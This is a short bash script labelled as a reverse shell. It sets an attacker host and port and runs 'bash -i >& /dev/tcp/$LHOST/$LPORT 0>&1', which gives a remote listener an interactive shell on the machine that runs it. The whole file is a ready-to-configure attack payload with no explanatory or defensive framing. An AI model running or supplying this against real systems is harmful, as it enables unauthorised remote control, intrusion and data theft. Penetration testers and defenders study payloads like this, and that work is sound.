#!/bin/bash
# Bash Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4444

bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1